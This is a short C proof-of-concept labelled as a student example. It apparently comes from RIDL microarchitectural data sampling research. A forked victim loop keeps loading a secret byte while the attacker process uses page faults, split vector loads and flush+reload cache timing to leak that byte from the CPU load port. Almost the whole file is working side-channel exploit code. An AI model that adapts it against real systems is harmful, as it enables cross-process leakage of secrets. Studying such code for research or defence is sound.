/*
loadport test (simple example for students)
*/
#define ITERS 1000

#define START 32
#define END 64

#include "ridl.h"

int main(int argc, char *argv[]) {
	(void)argc; (void)argv;

	enable_SSBM();

	pid_t pid = fork();
	if (pid == 0) {
		// leak 'N' by reading from offset 1
		volatile char source[32] = "XNXXYYYYZZZZQQQQAAAABBBBCCCCDDDD";

		/* victim code runs in a loop */
		while (1) {
			asm volatile(
			"movdqu 1(%0), %%xmm0\n" /* move value into load port */
			::"r"(&source):"rax"
		);
		}
	}
	/* *** end forked process *** */
	if (pid < 0) return 1;

	ALLOC_BUFFERS();

	leak = mmap(NULL, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);

	for (size_t offset = START; offset < END; ++offset) {
		memset(results, 0, sizeof(results));

		for (size_t i = 0; i < ITERS; ++i) {
#define PAGEFAULT
#ifdef PAGEFAULT
			/* cause a fault on either the first or the second page */
			//madvise(leak, 4096, MADV_DONTNEED);
			madvise(leak+4096, 4096, MADV_DONTNEED);
#endif

			flush(reloadbuffer);
			asm volatile("mfence\n");

#define USE_VECTOR /* use vector loads */
//#define USE_AVX /* use 32-byte vector loads */

			asm volatile(
#ifdef USE_VECTOR
 #ifdef USE_AVX
			"vmovdqu (%0), %%ymm0\n"
 #else
			"movdqu (%0), %%xmm0\n"
 #endif
			"movq %%xmm0, %%rax\n"
#else
			"movq (%0), %%rax\n"
#endif
			"andq $0xff, %%rax\n"
			"shl $0xa, %%rax\n"
			"prefetcht0 (%%rax, %1)\n"
			"mfence\n"
			/* start 4096 bytes before the end of the page; offsets>32 should cause a split */
			::"r"(leak + 4096 - 64 + offset), "r"(reloadbuffer):"rax","rbx","rcx"
			);

			reload(reloadbuffer, results);
		}

		printf("offset %d:\n", (int)offset);
		print_results(results);
	}

	kill(pid, SIGKILL);
}

